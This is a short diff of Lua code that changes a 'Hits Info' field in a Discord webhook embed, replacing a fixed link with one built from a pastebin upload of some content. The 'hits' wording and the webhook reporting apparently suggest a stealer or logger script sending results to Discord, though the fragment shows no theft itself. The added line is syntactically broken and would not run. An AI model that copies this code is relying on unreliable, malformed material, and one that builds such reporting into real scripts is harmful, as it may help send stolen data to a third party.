@@ -1083,7 +1083,7 @@ local WebHookEmbed = CreateEmbed(
         },
         {
         	name = "Hits Info",
-            value = "\n[**Click Me**](rawUrl)"
+            value = "\n"[**Click Me**](..pastebin(content)..)""..
         },
         {
             name = "ᴅɪꜱᴄᴏʀᴅ sᴇʀᴠᴇʀ", 
